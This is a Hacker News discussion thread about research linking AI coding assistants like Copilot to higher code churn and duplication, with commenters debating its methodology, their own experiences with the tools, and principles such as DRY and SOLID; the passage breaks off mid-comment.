agorootparentIt‘s the Duolingo of software engineering. Real understanding requires real effort. reply Aeolun 9 hours agorootparentprevJust because they’re better than you does not mean they’re above average. Though standards have been going down, so maybe you are right. reply bee_rider 8 hours agorootparentprevEh, you could say it about compilers, then optimizing compilers… unless they are on their way to the post-scarcity world, the next generation will figure out a way to take advantage of new tools. Sure, lots of things will change, but people will adapt. I’d be more worried if I was somebody like Squarespace. When anybody can say “build me a neat looking website,” the business of selling templates looks rough. reply kromem 7 hours agorootparentOr it just means Squarespace has to pivot and extend their product offerings. Spend a bit in R&D to make sure they have a lock on ease of use at gen AI website building/modification, ideally starting from base templates and that's plug and play with their existing CMS. If anything, doing that could even increase their market share to users for whom simple templating was either (a) not enough, or (b) still too complex without additional handholding. For pretty much everyone, generative AI is a threat to those who stagnate in the status quo and an opportunity to those actively seeking growth and ever improved product market fit. reply therealdrag0 7 hours agoparentprevHow do you interface with it? Are you pasting chunks of code into chat? Or just describing new code to write and then giving it feedback to rewrite it? Or something else? reply danielovichdk 14 hours agoprevWhen I look into the future, and I know that I really can't, one thing I really believe in is that there will be a shift in how quality will be perceived. With all things around me there is a sense that technology is to be a saviour for many very important things - ev's, medicine, it, finance etc. At the same time it is more and more clear to me that technology is used primarily to grow a market, government, country etc. But it does that by layering on top of already leaking abstractions. It's like solving a problem by only trying to solvent be its symptoms. Quality has a sense of slowness to it which I believe will be a necessary feat, both due to the fact that curing symptoms will fall short and because I believe that the human species simply cannot cope with the challenges by constantly applying more abstractions. The notion about going faster is wrong to me, mostly because I as a human being do not believe that quality is done by not understanding the fundamentals of a challenge, and by trying to solve it for superficial gains is simply unintelligent. LLMs is a disaster to our field because it caters to the average human fallacy of wanting to reach a goal but without putting in the real work to do so. The real work is of course to understand what it is that you are really trying to solve with applying assumptions about correctness. Luckily not all of us is trying to move faster but instead we are sharpening our minds and tools while we keep re-learing the fundamentals and applying thoughtful decisions in hope to make quality that will stand the test of time. reply jstummbillig 13 hours agoparent> The real work is of course to understand what it is that you are really trying to solve with applying assumptions about correctness. In how far do you think LLMs stand in the way of that? My experience has been very much the opposite: Instead of holding the hard part of the process up by digging through messy apis or libraries, LLMs (at least, in their current form but I suspect that this will theoretically simply remain true) make it painfully obvious when my thinking about a task of any significance is not sound. To get anywhere with a LLM, you need to write. To write, you have to think. Very often I find the most beneficial part of the LLM-coding-process is a blended chat backlog that I can refer back to, consisting of me carefully phrasing what it is that I want to do, being poked by a LLM, and me through this process finding gaps and clarifying my thoughts at the same time. I find this tremendously useful, specially when shaping the app early, to keep track of what I thought needed to be done and then later being able to reconsider if that is actually still the case. reply peterashford 12 hours agorootparentThis aligns with my thinking about the utility of LLMs: they're rubber duck programming as a service reply weikju 4 hours agorootparentprevThis is how I’ve been most successful so far at using LLMs. They help me poke as you say at the problem until a satisfying solution appears or until I have enough info to know what to look for. reply sph 1 hour agorootparentBut that is a terrible way of dealing with hard problems. I recommend Rich Hickey's \"Hammock Driven Development\" talk. You don't solve hard problems by poking at it repeatedly until something works, that is the recipe for terrible code and abstractions. You instead take a step back from your computer and digest it until you come with a well-understood solution. This approach is what separates the experienced engineer from the junior. Code is the least of your problems. reply Yodel0914 7 hours agorootparentprevI don't get so much from going over previous conversations, but needing to articulate a problem well enough to ask chatgpt a question is extremely useful. Far moreso than coming up with search phrases, I find. reply bamboozled 5 hours agoparentprevWhen I look into the future, and I know that I really can't, one thing I really believe in is that there will be a shift in how quality will be perceived. IKEA furniture is a great example of this. I build my own furniture and being around it is a much much nicer thing than some piece of cardboard from IKEA.but it seems like cost, soeed an convenience are the most important thing in peoples minds. reply 76SlashDolphin 2 hours agorootparentBut the tradeoff of cost and convenience vs quality is everywhere in life. Most people (including me) do not have the time, money, nor (in my case most importantly) workspace to build their own furniture. IKEA and other budget furnishing companies are a perfect solution for people in this situation and I can buy a handmade piece of furniture if I ever feel that something is not up to quality. reply norir 11 hours agoparentprevThere is an interview with the great jazz pianist Bill Evans (conducted by his brother) in which he muses that most amateur musicians make the mistake of overplaying. They go out to the club and hear a professional and they come home and try to approximate what the professional does. What they end up with is a confused mess with no foundation. He insists that you have to learn to be satisfied with doing the simple things and gradually building up a stronger foundation. I think his insight applies nearly as well to using code generated by an ai. reply chiefalchemist 12 hours agoparentprev> LLMs is a disaster to our field because it caters to the average human fallacy of wanting to reach a goal but without putting in the real work to do so. It's a tool. It doesn't make sense to blame the tool. Is it the screwdriver's fault it gets used as a hammer? Or a murder weapon? Used intelligently Copilot & Co can help. It can handle the boilerplate, the mundane and free up the human element to focus on the heavy lifting. All that aside, it's early days. It's too early to pass judgement. And it seems unlikely it's going to go away. reply 0xedd 13 hours agoparentprevnext [5 more] [flagged] staunton 13 hours agorootparentPresumably, this was supposed to show how parent's arguments can equally well argue for the opposite or for something nonsensical. However, it seems incoherent to me (in a way that parent does not). I don't even know what it's arguing for... I guess something literally about sewing? reply binary132 12 hours agorootparentI think he’s making a point about mechanization inevitably causing both accelerated progress and also, in some ways, reduced quality. There’s a challenge to grapple with there for traditional craftsmanship. reply c0pium 13 hours agorootparentprevIt’s a style-transfer of OPs post onto Luddites. This same tired argument in 3 parts gets made every time a potentially job-destroying technology gets introduced or discussed. Since nobody has made the concluding argument yet, I’ll supply it; the Luddites were correct that it (mechanization) would destroy their lucrative profession, they missed the degree to which it would enable many other lucrative professions, and they were right that many Luddites would not make the transition. Society was net better off but there were definitely losers in the transition. reply gjgtcbkj 12 hours agorootparentprevThis kind of sounds like it was written by AI reply dweinus 15 hours agoprevThe methodology seems to be: compare commit activity from 2023 to prior years, without any idea of how many involve Copilot. Then interpret those changes with assumptions. That seems a bit shakey. Also: \"The projections for 2024 utilize OpenAI's gpt-4-1106-preview Assistant to run a quadratic regression on existing data.\" ...am I to understand they asked gpt to do a regression on the data (4 numbers) rather than running a simple regression tool (sklearn, r, even excel can do this)? Even if done correctly, it is not very compelling when based off of 4 data points and accounting for my first concern. reply zemo 12 hours agoparentcheck out the paper, not just the summary. They explain their methodology. The output has four data points because it’s a summary. The input is … more data than that. reply lolinder 11 hours agorootparentMore data, but OP is right on the weaknesses of the study—the author posted here [0] and acknowledged that they can't actually say anything about causality, just that 2023 looked different than 2020. [0] https://news.ycombinator.com/item?id=39168841 reply TOMDM 6 hours agorootparentI'd bet 2017 looked different from 2020 too. reply dweinus 4 hours agorootparentprevI did, that's where my quote is from. The appendix confirms; they ran the regressions on just two inputs: 2022 and 2023 totals. reply zeroonetwothree 9 hours agoparentprevI’m sympathetic to the study results since I have seen similar things anecdotally but I agree their data is not really warranting the conclusions they reach. For all we know it could because of the covid hiring spree and subsequent layoffs. reply mrweasel 15 hours agoprevPeople have different workflows, but mine is frequently, skim the documentation, make a prototype, refine code a bit, add tests, move stuff around, break stuff, rework code, study documentation, refactor a bit more, and then at that point I have enough understanding of the problem to go in at yank out 80% of my code and do it right. If Copilot gives me working code in the prototype stage, good enough that I can just move on to the next thing, my understanding is never going to be good enough that I can go in and structure everything correctly. It will effectively allow me to skip 90% of my workflow, but pay the price. That's not to say that Copilot can't be extremely helpful during the final steps of development. If those findings are correct, I can't say that I'm surprised. Bad code is written by poor understanding and Copilot can't have any understanding beyond what you provide it. It may write better code than the average programmer, but the result is no better than the input given. People are extremely focused on \"prompt engineering\", so why act surprised when a poor \"prompt\" in VScode yields a poor result? reply andybak 14 hours agoparentI'm not sure why you decided that \"use copilot\" also implies missing out most of your later steps. Who decides to skip all those steps? Presumably you? My experience is that Copilot is great at getting me started. Sometimes the code is good, sometimes it's mediocre or completely broken. But it's invaluable at getting me thinking. I wasted a lot more time before I started using it. That might just be my weird brain wiring... (Edited to sound less narky. I shouldn't post from a mobile device) reply fwsgonzo 13 hours agorootparentI recently tried Copilot out of curiosity and this is my experience too: It helps me getting started, which for me is 99% of the challenge. I know how to solve problems, even complex ones, but for some reason getting started is just so extremely hard, sometimes. Copilot lets me get started, even if it's wrong sometimes. There have been times where I have been surprised by how it took something I wrote for a server, and presented the correct client-side implementation. I've used it a few times to describe a problem and let it handle the solution. It's not very good, but I wonder if one should place more blame on PEBCAK and put more time into problem-description. I gave it a few more paragraphs to describe the problem, and eventually I could take it from there. It was still wrong, but enough to get me started. Immensely helpful that way. Another aspect that I'm wondering about is if it will be able to do more with better documented code. Anyone have experience with that? I've started to write more doxygen comments, and hoping to see if there's a slow shift to more accurate predictions. reply theshrike79 2 hours agorootparent> It helps me getting started This is like writing in general. It's easy to edit crappy text you've written into something better. It's completely impossible to do it to a text you didn't write at all. LLM models are pretty good in doing the crappy first version. It might use abandoned packages or old APIs but the skeleton is there. It's not that hard to add some meat on the bones when the structure exists. Recently I had to parse a pretty crappy XML format (planned by committee) with Go. I just fed the XML to GPT4 and asked it to parse specific values from it. It got like 95% there. I just had to do a few fixes and polish it a bit. Saved me a lot of headache and poking around in documentation. reply bamboozled 8 hours agorootparentprevI’ve circumvented all of this “getting started” trouble with the pomodoro method. It’s simple and I don’t have to real with maybe broken code and it works for everything in my life. Worth a try. reply wbharding 14 hours agoprevOriginal research author here. It's exciting to find so many thinking about long-term code quality! The 2023 increase in churned & duplicated (aka copy/pasted) code, alongside the reduction in moved code, was certainly beyond what we expected to find. We hope it leads dev teams, and AI Assistant builders, to adopt measurement & incentives that promote reused code over newly added code. Especially for those poor teams whose managers think LoC should be a component of performance evaluations (around 1 in 3, according to GH research), the current generation of code assistants make it dangerously easy to hit tab, commit, and seed future tech debt. As Adam Tornhill eloquently put it on Twitter, \"the main challenge with AI assisted programming is that it becomes so easy to generate a lot of code that shouldn't have been written in the first place.\" That said, our research significance is currently limited in that it does not directly measure what code was AI-authored -- it only charts the correlation between code quality over the last 4 years and the proliferation of AI Assistants. We hope GitHub (or other AI Assistant companies) will consider partnering with us on follow-up research to directly measure code quality differences in code that is \"completely AI suggested,\" \"AI suggested with human change,\" and \"written from scratch.\" We would also like the next iteration of our research to directly measure how bug frequency is changing with AI usage. If anyone has other ideas for what they'd like to see measured, we welcome suggestions! We endeavor to publish a new research paper every ~2 months. reply oooyay 14 hours agoparent> We hope it leads dev teams, and AI Assistant builders, to adopt measurement & incentives that promote reused code over newly added code. imo, this is just replacing one silly measure with another. Code reuse can be powerful within a code base but I've witnessed it cause chaos when it spans code bases. That's to say, it can be both useful and inappropriate/chaotic and the result largely depends on judgement. I'd rather us start grading developers based on the outcomes of software. For instance, their organizational impact compared to their resource footprint or errors generated by a service that are not derivative of a dependent service/infra. A programmer is responsible for much more than just they code they right; the modern programmer is a purposefully bastardized amalgamation of: - Quality Engineer / Tester - Technical Product Manager - Project Manager - Programmer - Performance Engineer - Infrastructure Engineer Edit: Not to say anything of your research; I'm glad there are people who care so deeply about code quality. I just think we should be thinking about how to grade a bit differently. reply zemo 10 hours agorootparent> this is just replacing one silly measure with another > Not to say anything of your research The second statement isn't true just because you want it to be true. The first statement renders it untrue. > I'd rather us start grading developers based on the outcomes of software. For instance, ... errors generated by a service yeah you should click through and read the whitepaper and not just the summary. The authors talk about similar ideas. For example, from the paper: > The more Churn becomes commonplace, the greater the risk of mistakes being deployed to production. If the current pattern continues into 2024, more than 7% of all code changes will be reverted within two weeks, double the rate of 2021. Based on this data, we expect to see an increase in Google DORA's \"Change Failure Rate\" when the “2024 State of Devops” report is released later in the year, contingent on that research using data from AI-assisted developers in 2023. The authors are describing one measurable signal while openly expressing interest in the topics you're mentioning. The thing is: what's in this paper is a leading indicator, while what you're talking about is a lagging indicator. There's not really a clear hypothesis as to why, for example, increased code churn would reduce the number of production incidents, the mean time to resolution of dealing with incidents, etc. reply lolinder 14 hours agoparentprev> That said, our research significance is currently limited in that it does not directly measure what code was AI-authored -- it only charts the correlation between code quality over the last 4 years and the proliferation of AI Assistants So, would a more accurate title for this be \"New research shows code quality has declined over the last four years\"? Did you do anything to control for other possible explanations, like the changing tech economy? reply spaniard89277 15 hours agoprevI'm a junior, and I have Codeium installed in VSCode. I've found it very distracting most of the times, I don't really understand why so many people uses this kind of assistants. I find stuff like Phind useful, in the sense that sometimes something happens that I don't understand, and 60% of the times Phind actually helps me to understand the problem. Like finding trivial bugs that I didn't spot because I'm tired, dumb, etc. On the other hand, with Codeium, I guess it may be useful when you're just churning boilerplate code for some framework, but in my little expericence (writing scrapers and stupid data pipelines & vanilla JS + HTML/CSS) cycling through suggestions is very irritating, specially because many times it doesn't work. Most of the times for stupid reasons, like lacking an argument or something like that, but then it's time you have to spend debugging it. Another problem I have is that I find there's a common style of JS which consist in daisy-chaining a myriad of methods and anonymous functions, and I really struggle with this. I like to break stuff into lines, name my functions and variables, etc. And so many times code suggestions follow this style. I guess it's what they've been trained on. Codeium is supposed to learn from this, and sometimes it does, to be fair. But what I worry the most is that, If I'm a junior and I let this assistants do the code for me ¿How the hell I'm supposed to learn? Because giving Phind context + questions helps me learn or gives me direction to go on find it by myself in the internet, but if the only thing I do is press tab, I don't know how the hell I'm supposed to learn. I found a couple days ago that many people (including devs) are not using LLMs to get better but it's just a substitute of their effort. Isn't people afraid of this? Not because companies are going to replace you, but it's also a self-reflection issue. Coding is not the passion of my life, addmitedly, but I like it. I like it because it helps me to make stuff happen and to handle complexity. If you can't understand what's happening you won't be able to make stuff happen and much less to spot when is complexity going to eat you. reply withinboredom 15 hours agoparentI think probably the best use of AI, so far, was when I went into a controller and told it to generate an openAPI spec ... and it got it nearly right. I only had to modify some of the models to reflect reality. BUT (and this is key), I've hand-written so many API specs in my career that 1) I was able to spot the issues immediately, and 2) I could correct them without any further assistance (refining my prompt would have taken longer than simply fixing the models by hand). For stuff where you know the domain quite well, it's amazing to watch something get done in 30s that you know would have taken you the entire morning. I get what you're saying though, I wouldn't consider asking the AI to do something I don't know how to do, though I do have many conversations with the AI about what I'm working on. Various things about trade-offs, potential security issues, etc. It's like having a junior engineer who has a PHD in how my language works. It doesn't understand much, but what it does understand, it appears to understand it deeply. reply staunton 13 hours agorootparent> I wouldn't consider asking the AI to do something I don't know how to do My experience has been the opposite so far. I benefit much more from such tools when I can easily check if something works correctly and would have to learn/look up a lot of easy and elementary stuff to do it from scratch. For example, adding to some existing code in a language I don't know and don't have time or need to learn (I guess not many people are often in that situation). I get a lot of hints for what methods and libraries are available, I don't have to know the language syntax, for easy few-line snippets (that do standard things and which I can test separately) the first solution usually just works. This is deliberately passing on an opportunity for deeper and faster learning, which is a bad idea in general, but sometimes the speed trade-off is worth it. On the other hand, for problems where I know how to solve them, getting some model to generate the solution I want (or at least one I'm happy with) tends to be more work than just doing it myself. I probably could improve a lot in how I use the available tools. Haven't had that much opportunity yet to play with them... reply kromem 7 hours agoparentprevWhile I can't speak to Codeium, you might want to try Copilot in a more mature codebase that reflects your style of composition. The amazing part for me with the tech is when it matches my style and preferences - naming things the way I want them, correctly using the method I just wrote in place of repeating itself, etc. I haven't used it much in blank or small projects, but I'd imagine I'd find it much less ideal if it wasn't so strongly biased towards how I already write code given the surrounding context on which it draws. reply jacquesm 14 hours agoparentprev> Coding is not the passion of my life, addmitedly, but I like it. It may not be the passion of your life but I haven't seen anybody articulate better (in recent memory) what they want to get out of coding and how they evaluate their tools. Keep at it, don't change and you'll go places, you are definitely on the right path. reply mvdtnz 12 hours agoparentprev> Another problem I have is that I find there's a common style of JS which consist in daisy-chaining a myriad of methods and anonymous functions, and I really struggle with this. I like to break stuff into lines, name my functions and variables, etc. I think your whole comment is excellent but I just wanted to tell you, you're on the right track here. Certain developers, and in particular JS developers, love to chain things together for no benefit other than keeping it on one line. Which is no benefit at all. Keep doing what you're doing and don't let this moronic idiom infect your mind. reply xanderlewis 12 hours agorootparentSometimes making something a one-liner is itself a benefit for readability. Especially if you’re used to reading it. But admittedly it’s very easy (and can be tempting) to take it too far… reply vjerancrnjak 1 hour agorootparentprevThis is just another coding style. After 1-2 weeks you get used to whatever you're reading. Try it and you'll see. It's the high-level code that can become an issue (structuring the state of your program, using dependency injection incorrectly, having a convoluted monad transformer stack, putting very specifically typed effects in your Reader etc.). If you make mistakes there, you will struggle to read, write and reuse code, and even then, not all is lost. If there's bad structure you can most often transform it into a good one. When there's no structure, that's a problem. Seeing .map.filter becomes a quick pattern match. You know what's happening there. It does not matter if it's a named variable or just part of a long a.map .filter .reduce .map chain. I agree, if your goal is to hire a lot of people, then you might want a style that does not strain the pattern matching abilities too much. We can compare which style is the best for that. Nothing stops you from extracting a sequence from a long chain into a function to reuse it elsewhere. pipe( object, map, filter, ... ) Many languages today allow declaring functions inside functions. I'd argue that in that case it's better you declare functions as close as possible to the place where you'll call them, which can be inside another function. reply zeroonetwothree 9 hours agorootparentprevThe downside of extra variables used only once is that as a reader of the code I have to think about whether they might be used again. reply mvdtnz 8 hours agorootparentI know what you mean, but in this situation it shouldn't be a major problem. These would be variables scoped locally and one would hope that this scope would not be more than about a page of code, and hopefully much less. Also - one would hope that local variables are not being re-used! reply tpmoney 14 hours agoparentprevThe tool and design of the tool matters a lot. I've used Codeium in VSC and GH Copilot in Intellij, and the experience (and quality) of the GH + Intellij paring is much better than Codeium + VSC. My biggest use for AI assistants has been speeding up test writing and any \"this but slightly different\" repetitive changes to a code base (which admittedly is also a lot of test writing). At least in intellij + GH, things like, a new parameter that now needs to be accounted for across multiple methods and files is usually a matter of \"enter + tab\" after I've manually typed out the first two or three variants of what I'm trying to do. Context gives it the rest. In VSC with Codeium, the AI doesn't seem quite as up to snuff, and the plugin is written in such a way that its suggestions and the keys for accepting them seem to get in the way a lot. It's still helpful for repetitive stuff, but less so for providing a way of accomplishing a given goal. reply alkonaut 1 hour agoprevCoPilot is good a as a one line autocomplete. It's short enough that you can review the suggestion and decide whether or not to accept the autocompletion or type out your own completion. For reasoning about larger chunks of code I find ChatGPT better than CoPilot as an LLM assistant. Trying to use CoPilot for making large sections of boilerplate like the kind you might see in a db->api->web project is just full of frustration. It doesn't realize it makes makes tiny inconsistencies everywhere so you are permanently babysitting. I think the key takeaway is that if you have repeated code (An entity, a DTO, a controller, a frontend component all sharing some set of names/properties) then its better to change jobs than change tools. reply godzillabrennus 15 hours agoprevI decided to use ChatGPT to build a clone of Yourls using Django/Python. I gave it specific instructions to not only allow for a custom shortened URL but to track the traffic. It didn’t properly contemplate how to do that in the logic or data model. I had to feed it specific instructions afterwards to get it fixed. AI tools are akin to having a junior developer working for you. Except they are much much faster. If you don’t know what you’re doing they just accelerate the pace that you make mistakes. reply konschubert 13 hours agoparent> If you don’t know what you’re doing they just accelerate the pace that you make mistakes. 100% And if you know what you are doing, they will accelerate the way you're building stuff. reply johnfn 2 hours agorootparentI pressed down the pedal on my car and it drove off a cliff! reply geraneum 11 hours agorootparentprevIt’s not always clear to everyone that there’s something they don’t know! reply Filligree 9 hours agorootparentTrue. But if you pay attention to how well the AI does, you have a decent chance of finding out! reply KronisLV 14 hours agoparentprev> AI tools are akin to having a junior developer working for you. Except they are much much faster. Honestly, this is brilliant. The other day I had to add table name prefixes to a SELECT statement column aliases, since such a feature just doesn't exist for some reason, a bit like: -- fails because of duplicate column names (e.g. when creating a view) SELECT * FROM table_a JOIN table_b ON ... JOIN table_c ON ... ... -- this would solve my issue, if WITH_PREFIX did exist (or anything like it) SELECT table_a.* WITH_PREFIX 'table_a', table_b.* WITH_PREFIX 'table_b', table_c.* WITH_PREFIX 'table_c' FROM table_a JOIN table_b ON ... JOIN table_c ON ... ... So I just gave ChatGPT the schema definitions/query and it wrote out the long list of like 40 columns to be selected for me, like: SELECT table_a.id AS 'table_a_id', table_a.email AS 'table_a_email', ... table_b.id AS 'table_b_id', table_b.start_date AS 'table_b_start_date', ... and so on. I haven't found another good way to automate things like that across different RDBMSes (different queries for system tables that have schema information) and while it's possible with regex or a bit of other types of text manipulation, just describing the problem and getting the output I needed was delightfully simple. Aside from that, I just use the LLMs as autocomplete, which also encourages me to have good function naming, since often enough that's sufficient information for the LLM to get started with giving me a reasonable starting point. In particular, when it comes to APIs or languages I haven't used a lot, but the problems that I face have been solved by others thousands of times before. I don't even have to use StackOverflow much anymore. That's why I bought Copilot (though JS/HTML autocomplete in JetBrains IDEs is visually buggy for some reason) and use ChatGPT quite a lot. LLMs are definitely one of my favorite things, after IntelliSense (and other decent autocomplete), codegen (creating OpenAPI specs from your controllers, or bootstrapping your EF/JPA code from a live dev database schema), as well as model driven development (generating your DB schema migrations/tables from an ER model) and containers (easily packaged, self-contained environments/apps) and smart IDEs (JetBrains ones). reply addaon 9 hours agorootparent> it wrote out the long list of like 40 columns to be selected for me It seems like the process of reviewing its generated code to make sure all 40 columns are there and then either re-doing this or manually going through that list whenever the schema changes would take longer than just writing the script? And now you're asking your code reviewers to the same both boring-and-slow manual check on the commit rather than just reviewing the three lines of the script? reply cleandreams 13 hours agoparentprevMy question is, how do you become a senior developer when the junior developer just keeps throwing \"working\" \"good enough\" code at you? I think companies will want more code faster to the extent that fewer people will emerge from the churn really knowing what they are doing. reply freedomben 2 hours agoprevSomething I didn't see mentioned is also that over time this is going to feedback loop into the training set and compound (possibly exponentially). I.e. as more lower quality code hits github and is used for training, the output of the code will decline, which causes lower quality code to hit github, which causes output to further decline, etc. I am an experienced dev but new to ML so take with a grain of salt, but I really wonder if the future is going to be quality in the training sets rather than quantity. I have heard that the \"emergent properties\" don't seem really affected by bad data as long as the set is large enough, but at what point does this cease to be true? How do we guard against this? reply mvdtnz 13 hours agoprevThere was already a backlash against DRY code occurring before \"AI\" assistants hit the market, sadly. It was a growing movement when I was using Twitter in 2019-2022. Some younger developers have a very different attitude to code than what I was brought up with. They have immense disdain for the Gang of Four and their design patterns (probably without realising that their favourite frameworks are packed to the gills with these very patterns). They speak snidely about principles like DRY and especially SOLID. And on places like Twitter the more snide and contrarian you can be, the more engagement you'll get. Very disturbing stuff. reply Mawr 4 hours agoparentThe backlash isn't against proper DRY (concerned with single source of truth) but fake DRY (concerned with syntactically-similiar code). Immense disdain does accurately describe how I feel towards whatever it is happens in corporate codebases. No, creating layers upon layers of indirection via classes is not ok, no matter what your SOLID guru tells you. Best practices, DRY, and SOLID are just excuses. reply tester756 9 hours agoparentprevMaybe because SOLID is overrated / overhyped marketing term which somehow made it to academy despite being far from actual computer science / software engineering fundamentals? We just cant stand acting as if that random list of principles created by Java's OOP mind was some source of truth for software modeling. We're just tired of seeing bilionth discussion about how to understand SOLID You probably don't see people arguing against CAP theorem because it is not some arbitrary collection of ideas (not even fully authored by SOLID author) which composes fancy mnemonic >There was already a backlash against DRY code occurring before \"AI\" assistants hit the market, sadly. As everything else - DRY can be abused too and people backlash against acting as those things were flawless when they arent. reply osigurdson 13 hours agoparentprevI'm not a younger developer but I also speak snidely about SOLID and DRY. I also care a lot about code quality. reply geitir 7 hours agorootparentNo opinion on SOLID with regard to your comment. But DRY is foundational to any code because it forces you to find the right abstraction. reply bootsmann 1 hour agorootparentThis is the kind of thinking that leads to unmaintainable AbstractFactoriesFactory classes. Sometimes allowing repeat code is good because two functions might drift away from common functionality in the future which would require a major rework of whatever abstraction you put over them to get them under the same roof. reply padjo 1 hour agorootparentprevNo, it just forces you to find an abstraction, not necessarily a good one. Badly designed abstractions can be far worse than repetition. reply osigurdson 6 hours agorootparentprevIf code is copied and pasted everywhere that is obviously bad. However, some repeated code is better than none in many cases. reply Kiro 13 hours agoparentprevYeah, like this dude: https://twitter.com/ID_AA_Carmack/status/753745532619665408 reply mvdtnz 12 hours agorootparent\"DRY isn't absolute\" is not what I was talking about. No serious developer considers any principle \"absolute\". reply osigurdson 8 hours agorootparentI think of SOLID and DRY as primarily tools used back in the day by Uncle Bob et all to sell books and event tickets. reply vasco 12 hours agorootparentprevOnly a sith deals in absolutes. reply ukuina 11 hours agorootparentDon't try it, he has the high ground. reply Chris_Newton 9 hours agoparentprevI’ve noticed similar trends. After a while, I started to realise that a lot of the critics don’t really understand the principle they’re criticising. For example, take DRY. The important principle was never really about repeating code. It was about repeating ideas. For any given concept in your system, ideally there should be a single source of truth, and therefore a single place you need to understand or change if you’re working with that concept. It’s true that this means copying and pasting non-trivial amounts of code instead of creating a meaningful abstraction is often a bad idea. But it is also a warning that any time you do repeat an idea, you now have an ongoing liability because you need to keep those different representations in sync. That could refer to database migrations that define your schema and separate ORM class definitions, or an API you define in your back-end code and a client for that API you define in your front-end code, or a retained mode UI where you have a current value in some form field that corresponds to a specific value in your internal application state, or some invariant in your data model that can be represented in both types and unit tests. People who object to combining duplicate or near-duplicate code that represents different ideas but happens to have a similar implementation at the time, on the basis that it’s a maintenance hazard for later on, aren’t wrong. They’re just objecting to a straw man that was never really the point of DRY in the first place, but has been treated as if it were due to some kind of cargo cult/gaslighting effect. The question I have now is where and when in our industry do we expect new developers to learn these principles so they do understand them properly? Some people have a formal background in CS or the like, but not everyone does, and in any case it’s not necessarily the role of an academic CS course to teach a lot of practical software development skills. I had a discussion the other day about how when I was starting out, the senior developers would give real, substantial training to the juniors to help us learn and understand these principles, but with the job-hopping culture today and the resulting general aversion to hiring juniors as a long-term investment, that just doesn’t seem to happen much any more. There are formal courses that cost a lot by personal standards but almost nothing by business standards, but there must be a tiny proportion of new developers who actually get sent on them by their employers. There are a few books worth reading, but what 20-something in 2024 wants to deal with presentation as antiquated as ink on sliced bits of tree? I suspect a lot of what today’s up and coming developers learn about these ideas comes from sources like blogs and YouTube videos, where again there is some great material out there, but as ever the problem is finding it among all the poorly understood and dubiously presented dross. And then we wonder why tools come along that seem like magic, producing a dozen lines of code in a heartbeat that seem to mostly work, and young developers think they’re great even while having little idea of all the deeper things that may be wrong with that code. It’s not really surprising, and I’m not sure it’s really anyone’s fault, but it’s definitely a problem and I wish I knew what we should do about it. reply deadbabe 13 hours agoparentprevDRY is mostly bad. You couple a lot of things together by making them all share the same code and then a small change to that code breaks various unrelated components. reply abathur 12 hours agorootparentI don't think it's mostly good or mostly bad in the abstract. DRYing code repeated for the same reason is mostly good. DRYing code coincidentally repeated for different reasons will sow code churn or inadvertent behavior shifts. reply deadbabe 8 hours agorootparentIf the reason for DRYing up code is simply because it looks the same as some other code, that’s a bad reason. reply bobmaxup 12 hours agorootparentprev...said no one who inherited the maintenance of hundreds of thousands of lines of copy pasted code. reply Spivak 9 hours agorootparentGod I would love that. Are you kidding? I've always hoped I'd get to inherit one. A codebase where each component \"vendors\" all its dependencies so you can fearlessly make changes and not affect anything else. You're describing heaven for a maintenance programmer -- I'm only looking at the codebase because there's a bug in some component, I likely even have a stack trace. If can just read what that bit of code does top to bottom, fix the error in just that component, write a test and ship I'll send the original author chocolates. reply durumu 6 hours agorootparentSure, that would fix the bug immediately in front of you, but what if the same bug exists in several of the other copies of the dependency? Are you going to be able to track all of the occurrences down? I think that's the big tradeoff. reply bobmaxup 7 hours agorootparentprevIt is hard to know if you have fixed or broke something when there are hundreds of distinct variants of it and no way to test its correctness. Also, not all maintenance involves correcting inborn defects. reply charles_f 12 hours agorootparentprevDry's mostly a smell test to be applied when copying stuff over, to check that you're doing that for the right reasons, rather than expediting shit. reply osigurdson 10 hours agorootparentFor sure, there are obvious egregious examples of repeating one's self. There are also many more examples of developers programming by unexamined catch phrases. reply caesil 10 hours agorootparentprevIt also frequently leads people to violate YAGNI reply simonw 15 hours agoprevThe full paper is here: https://gitclear-public.s3.us-west-2.amazonaws.com/Coding-on... reply stusmall 14 hours agoparentThank you for the source. reply darepublic 14 hours agoprevSometimes less dry code can actually be easier to read and understand at the point of usage than dry code that has been more highly abstracted and requires grokking a sort of quasi DSL that defines the abstraction. Assuming that AI contributions will only increase, if a codebase were almost completely written by AI perhaps the benefits of DRY would diminish vs on the spot readability by humans only trying to understand the code and not personally add to it reply chongli 14 hours agoparentWell as with anything, DSLs are subject to the rules of good design. A really well-designed DSL (such as SQL) takes on a life of its own and becomes incredibly ubiquitous and useful to know in its own right. Many other DSLs are totally unknown, not worth learning, and serve as barriers to code understanding. I don’t know of too many people who would advocate replacing SQL with hand-written C manipulating B-trees and hash tables. Similarly, it’s pretty rare that you want to hand-roll a parser in C over using a parser generator DSL or even something like regex. reply firtoz 1 hour agoprevPersonally, I experience a great boom to my productivity. Sure, the code I get from copilot is not \"the best\", however it allows me to get so much more done. If it makes a mistake or two it's not really that big of a deal. However, I don't work in finance or \"really important stuff\", so ymmv. reply padjo 15 hours agoprevThe real news here is that the authors have apparently found an objective and universal measure of code quality. reply o11c 12 hours agoparentEh, it's not that such measures don't exist - they're just noisy. And the thing about AI is that their negative impact is clearly visible above the noise. reply danpalmer 9 hours agoprevThis certainly fits with my experience and biases. When using Copilot, I felt that it tried to be too clever, and often got things wrong. It would try to write a function based on the name, and would go one of three ways: either the function was a trivial one-liner and it saved me ~2 seconds of typing after I figured out if it was correct, or it was a complex function where it cost me ~2 seconds to figure out it was waaaaay off the mark, or it saved me 30 seconds up-front by producing something that appeared correct, but that I found out 10 minutes of debugging later was actually subtly incorrect in a way that I couldn't spot when reading quickly, but likely wouldn't have written myself. What I really want is a smarter intellisense, whereas Copilot is a dumber pair programmer. I want smart, style-aware, context-aware tab completion on boilerplate, not on business logic. Unfortunately I think many people are using it for business logic and that seems to be the direction the product is going. reply chilldsgn 3 hours agoprevI have a Jetbrains AI subscription and I use it mostly to write commit messages. It speeds up my work significantly, but I still have to skim over the generated output to make sure the message is correct. I tried it for code generation and it broke DRY multiple times. It's still faster for me to just build a thing without code generation. I'm not a wizard with my IDE, but I've gotten to a point where I'm pretty fast with some things I need to get done, it's muscle memory. I am a bit fanatic about verbose variable names, and sometimes the AI creates terrible names for variables, which I go and change anyway. reply freedomben 2 hours agoprevIt looks like the trend started heading upwards before AI took over. Are we sure this wasn't just the way it was heading anyway? Is there a control group that doesn't show the same line? Overall from personal experience TFA's conclusions do seem correct to me, but I want to make sure we aren't confirmation biasing the interpretation of the data. reply adonese 12 hours agoprevHave been using chatgpt/ copilot for a while now and I feel I know better the limitations and what it can achieve most: - unit testing and docs, readme - when it can potentially 